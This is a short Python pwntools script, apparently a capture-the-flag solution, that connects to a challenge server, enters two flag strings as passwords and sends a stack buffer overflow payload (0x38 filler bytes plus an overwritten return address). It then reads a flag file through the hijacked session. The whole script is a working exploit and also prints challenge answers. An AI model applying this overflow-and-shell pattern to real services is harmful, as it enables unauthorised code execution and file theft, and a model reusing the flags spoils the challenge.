from pwn import *

p = remote('mngmnt-iface.ctfcompetition.com', 1337)

print p.recvuntil('Quit')
p.sendline('1')
print p.recvuntil('password:')
p.sendline('CTF{I_luv_buggy_sOFtware}')
print p.recvuntil('password:')
p.sendline('CTF{Two_PasSworDz_Better_th4n_1_k?}')
print p.recvuntil('> ')

payload = 'A'*0x38
payload += p64(0x41414349)

p.sendline(payload)
p.sendline('quit')

print p.recvuntil('Bye!')

p.sendline('cat an0th3r_fl44444g_yo')
print p.recvline()
print p.recvline()

p.close()